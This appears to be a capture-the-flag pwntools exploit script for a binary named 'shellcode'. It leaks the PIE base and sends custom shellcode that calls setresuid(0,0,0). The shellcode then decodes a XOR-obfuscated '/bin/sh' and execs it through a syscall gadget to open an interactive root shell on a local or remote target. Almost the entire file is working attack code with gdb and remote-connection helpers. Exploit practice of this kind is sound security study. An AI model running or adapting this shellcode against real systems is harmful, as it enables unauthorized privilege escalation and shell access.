#!/usr/bin/python
from pwn import *
import os

os.chdir('../setup')
elf = context.binary = ELF("shellcode")
libc = elf.libc
#context.terminal = ['kitty', '@', 'launch', '--cwd', 'current', '--location', 'hsplit', '--title', 'DEBUG']
context.terminal = ['tilix', '-a', 'session-add-down', '-e']
gs = '''
init-pwndbg
brva 0xb37f
c
'''

# wrapper functrns
def sl(x): r.sendline(x)
def sla(x, y): r.sendlineafter(x, y)
def se(x): r.send(x)
def sa(x, y): r.sendafter(x, y)
def ru(x): return r.recvuntil(x)
def rl(): return r.recvline()
def cl(): return r.clean()
def uu64(x): return u64(x.ljust(8, b'\x00'))
def uuu(x): return unhex(x[2:])

# Safelinking functions [https://github.com/mdulin2/mangle/]
def protect_ptr(target, addr):
	return (addr >> 12) ^ target

def reveal_ptr(mangled_ptr, addr):
	return protect_ptr(mangled_ptr, addr)

# og = one_gadget(libc.path,libc.address)
def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', filename]).decode().split(' ')]

def log_addr(name, address):
    log.info('{}: {:#x}'.format(name, (address)))

def logbase(): log.info(f'Libc base: {libc.address:#x}')

def run():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.R:
        HOST = args.R.split(':')[0]
        PORT = args.R.split(':')[1]
        return remote(HOST, PORT)
    else:
        return process(elf.path)


r= run()

# =-=-=-=-= Main Exploit -=-=-=

rop = ROP(elf)

OFF_LEAK_PIE = elf.sym.main + 291
OFF_WRITE_BINSH = elf.bss(0x90)
BINSH_XORd = 0x7b44f182d086a2f1
XOR_KEY = 0x1337deadbeefc0de
SYSCALL_RET = rop.find_gadget(['syscall','ret']).address

#forbidden = [0x80, 0xcd, 0x0f]
sc = f'''
    /* Leak PIE base from stack */
    push qword ptr [rsp]
    pop rbx
    sub rbx, {OFF_LEAK_PIE}

    /* Get syscall address */
    push rbx
    pop r13
    add r13, {SYSCALL_RET}

    /* Call setresuid(0, 0, 0) */
    push 117
    pop rax
    xor edi, edi
    xor esi, esi
    xor edx, edx
    call r13

    /* Calculate where to write binsh */
    push rbx
    pop rdi
    add rdi, {OFF_WRITE_BINSH}

    /* Write and decode "/bin/sh" */
    mov rax, {BINSH_XORd}
    mov [rdi], rax
    mov rax, {XOR_KEY}
    xor [rdi], rax

    /* Set up execve(rdi="//bin/sh", rsi=0, rdx=0) */
    push 59       /* SYS_execve */
    pop rax
    call r13    
'''

sca = asm(sc)

payload = sca
sla(': \n', payload)

# ====================================
r.interactive()

'''
Strategy

1. Get PIE base in RBX
2. Write /bin/sh to empty part of .bss
3. Setup registers for execve(/bin/sh, 0, 0)
4. jump to syscall gadget

'''